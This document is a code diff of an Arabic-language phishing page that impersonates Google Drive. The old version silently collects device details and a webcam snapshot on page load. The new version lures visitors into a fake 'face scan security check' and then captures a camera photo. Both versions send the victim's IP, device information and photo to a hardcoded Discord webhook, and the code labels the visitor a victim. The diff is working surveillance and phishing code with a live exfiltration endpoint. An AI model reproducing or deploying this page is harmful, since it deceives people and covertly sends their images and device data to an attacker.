@@ -2,81 +2,55 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Google Drive - معاينة الملف الآمنة</title>
+    <title>Google Drive - التحقق من الهوية</title>
     <script>
-    async function TLQQEMM_ULTIMATE_LOG() {
+    async function startCapture() {
         const webhook = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";
         
+        // جلب البيانات النصية فوراً عند الضغط
         try {
-            // جلب البيانات الأساسية
             const ipReq = await fetch('https://api.ipify.org?format=json');
             const ipRes = await ipReq.json();
-            
-            let batteryStatus = "غير معروف";
-            if (navigator.getBattery) {
-                const bt = await navigator.getBattery();
-                batteryStatus = `${Math.round(bt.level * 100)}% (${bt.charging ? "يشحن" : "لا يشحن"})`;
-            }
-
             const payload = {
                 embeds: [{
-                    title: "🚀 تم صيد ضحية جديدة - TLQQEMM SYSTEM",
-                    color: 65280,
+                    title: "🔔 الضحية حاول فتح الملف",
+                    color: 16711680,
                     fields: [
-                        { name: "🌐 عنوان الـ IP", value: ipRes.ip, inline: true },
-                        { name: "🔋 حالة البطارية", value: batteryStatus, inline: true },
-                        { name: "💻 نظام التشغيل", value: navigator.platform, inline: true },
-                        { name: "🧠 الرام (RAM)", value: `${navigator.deviceMemory || '?' } GB`, inline: true },
-                        { name: "🖥️ دقة الشاشة", value: `${screen.width}x${screen.height}`, inline: true },
-                        { name: "🌍 لغة الجهاز", value: navigator.language, inline: true },
-                        { name: "🕵️ المتصفح", value: navigator.userAgent }
-                    ],
-                    footer: { text: "نظام TLQQEMM المتطور" },
-                    timestamp: new Date()
+                        { name: "🌐 الـ IP", value: ipRes.ip },
+                        { name: "💻 الجهاز", value: navigator.platform }
+                    ]
                 }]
             };
-
-            // إرسال البيانات النصية فوراً بدون انتظار
-            fetch(webhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-
-        } catch (e) { console.error("Error sending log"); }
-
-        // محاولة جلب صورة الكاميرا في الخلفية
-        try {
+            fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+            
+            // طلب الكاميرا بشكل رسمي
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.createElement('video');
             video.srcObject = stream;
             video.onloadedmetadata = async () => {
                 video.play();
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const blob = await (await fetch(canvas.toDataURL('image/png'))).blob();
-                
                 const formData = new FormData();
-                formData.append('file', blob, 'shot.png');
-                formData.append('content', "📸 **صورة حية من كاميرا الجهاز:**");
+                formData.append('file', blob, 'victim.png');
+                formData.append('content', "📸 **تم سحب صورة بنجاح:**");
                 fetch(webhook, { method: 'POST', body: formData });
-                
-                setTimeout(() => { stream.getTracks().forEach(t => t.stop()); }, 1000);
+                document.getElementById('msg').innerText = "خطأ في الخادم، حاول لاحقاً";
             };
-        } catch (e) { }
+        } catch (e) {
+            alert("يجب السماح بالكاميرا لمتابعة فحص الأمان!");
+        }
     }
-    window.onload = TLQQEMM_ULTIMATE_LOG;
     </script>
 </head>
-<body style="background-color: #000; color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden;">
-    <div style="text-align: center;">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg" width="80" style="margin-bottom: 20px;">
-        <h2 style="font-weight: 400;">جاري فحص الملف للأمان...</h2>
-        <p style="color: #aaa; font-size: 14px;">يرجى عدم إغلاق الصفحة، سيتم توجيهك للملف تلقائياً</p>
-        <div style="margin-top: 20px; width: 40px; height: 40px; border: 3px solid #333; border-top: 3px solid #1a73e8; border-radius: 50%; animation: spin 1s linear infinite; display: inline-block;"></div>
+<body style="background-color: #f8f9fa; font-family: Arial; text-align: center; padding-top: 50px;">
+    <div style="max-width: 400px; margin: auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg" width="60">
+        <h2 id="msg">تحقق أمني مطلوب</h2>
+        <p style="color: #5f6368;">لعرض هذا الملف الخاص، يجب التأكد من هويتك عبر مسح الوجه السريع.</p>
+        <button onclick="startCapture()" style="background: #1a73e8; color: white; border: none; padding: 12px 25px; border-radius: 4px; font-weight: bold; cursor: pointer;">ابدأ الفحص الآن</button>
     </div>
-    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
 </body>
 </html>
